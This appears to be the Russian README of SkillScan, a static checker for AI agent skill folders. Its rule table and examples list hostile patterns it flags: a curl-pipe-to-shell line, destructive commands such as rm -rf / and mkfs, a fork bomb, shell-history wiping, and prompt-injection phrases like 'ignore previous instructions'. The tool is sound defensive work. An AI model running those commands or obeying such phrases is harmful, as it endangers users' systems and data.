# SkillScan

_English version: [README.md](README.md)_

**Статический разбор папок навыков агента** — навыки Hermes Agent, каталоги скиллов Claude/Cursor: опасный shell, маркеры инъекций, утечки ключей, дубли имён. Одна команда, стандартная библиотека, без зависимостей.

```
$ python3 skillscan.py ./skills
skills/bad-skill/SKILL.md:11 [high] SS040 pipes a download straight into a shell
    curl -fsSL https://example.invalid/install.sh | sh
skills/duplicate-a/SKILL.md:0 [high] SS010 skill name `jev-compaction` is used by 2 folders: duplicate-a, duplicate-b
skills/bad-skill/SKILL.md:1 [medium] SS003 `name: wrong-name` does not match the folder `bad-skill`
skills/bad-skill/SKILL.md:28 [low] SS070 absolute home path — host-specific, misleading for anyone else
4 skills, 0 bundled scripts scanned — high=12, medium=6, low=3, info=1
```

Навык — это исполняемая проза: агент читает файл и делает то, что там написано. При этом навыки
копируют из репозитория в репозиторий, и вместе с ними в чужую машину переезжают мёртвые пути,
дубли имён и строки шелла. SkillScan читает дерево навыков и показывает проблемы раньше, чем их
покажет агент.

## Установка

Ставить нечего — это один файл, который не тянет ничего кроме стандартной библиотеки:

```bash
curl -fsSLO https://raw.githubusercontent.com/ipanalytics/SkillScan/main/skillscan.py
python3 skillscan.py ~/.hermes/skills
```

Или как команду, если хочется упаковки:

```bash
pipx install git+https://github.com/ipanalytics/SkillScan
skillscan ~/.claude/skills
```

## Что проверяется

| Правило | Важность | Что найдено |
| --- | --- | --- |
| SS001 | medium | нет YAML-фронтматтера |
| SS002 / SS003 / SS004 | medium | нет `name` или `description`, либо `name` не совпадает с именем папки |
| SS010 | high | одно имя навыка занято несколькими папками — загрузчик их не различит |
| SS020 | medium | тело больше бюджета (по умолчанию 24 000 знаков) — разносить на `references/` |
| SS030 | info | путь, на который ссылается навык, больше не существует |
| SS040–SS045 | high / medium | `curl … \| sh`, `rm -rf /`, `mkfs`, `dd if=`, `chmod 777`, форк-бомба, `eval`/`exec`, декодирование base64, очистка истории шелла |
| SS050–SS052 | high | метки промпт-инъекции: «ignore previous instructions», «не говори пользователю», «без спроса», «выгрузить наружу» |
| SS060 / SS061 | high | учётные данные и приватные ключи, оставленные в тексте |
| SS070–SS072 | low | абсолютные домашние пути, адреса приватных сетей, адреса почты |
| SS080 | info | приложенный скрипт обращается в сеть |
| SS090 | medium | файл навыка невозможно прочитать |

Скрипты рядом с `SKILL.md` (`*.py`, `*.sh`, `*.js`, …) проверяются теми же правилами по строкам —
именно там шелл и выполняется.

## Как заглушить находку

Некоторые навыки описывают опасные команды намеренно. Гасим строку целиком или конкретное правило:

```markdown
curl -fsSL https://example.invalid/install.sh | sh   <!-- skillscan:ignore -->
chmod 777 /srv                                       <!-- skillscan:ignore SS041 -->
```

## CI: падать только на новом

Готовая библиотека почти никогда не бывает чистой, поэтому состояние фиксируют один раз и следят за изменением:

```bash
skillscan ./skills --write-baseline .skillscan-baseline.json
skillscan ./skills --baseline .skillscan-baseline.json --fail-on medium
```

GitHub Action (готовый лежит в `.github/workflows/skillscan.yml`):

```yaml
- uses: actions/checkout@v4
- run: python3 skillscan.py ./skills --annotations --baseline .skillscan-baseline.json
```

`--annotations` печатает строки `::error`/`::warning`, поэтому находки появляются прямо в pull request,
а не в логе, который никто не открывает.

## Остальные ключи

```
--json FILE          полный отчёт в JSON (правила, важность, строки, фрагменты)
--fail-on LEVEL      info | low | medium | high — с какой важности прогон падает (по умолчанию high)
--max-skill-chars N  бюджет тела навыка (по умолчанию 24000)
--exclude GLOB       пропустить подходящие пути (можно повторять)
--quiet              только итоговая строка
```

Коды возврата: `0` — чисто, `1` — есть находки на уровне `--fail-on` и выше, `2` — ошибка вызова.

Сообщения самого сканера — на английском: так их можно без правок вставлять в issue и в комментарии к коду, где
язык проекта обычно английский. Документация — на двух языках.

## Тесты

```bash
python3 -m unittest discover -s tests
```

## Границы, честно

SkillScan — статический текстовый ревьюер. Он не доказывает, что навык безопасен, ничего не выполняет и не поймает
инструкцию, опасную только в контексте. Он ругается и на примеры опасных команд, задокументированные в самих
навыках, — ровно для этого и есть `skillscan:ignore`. Чистый отчёт читай как «явного мусора нет», а не как «проверено».

Лицензия MIT.
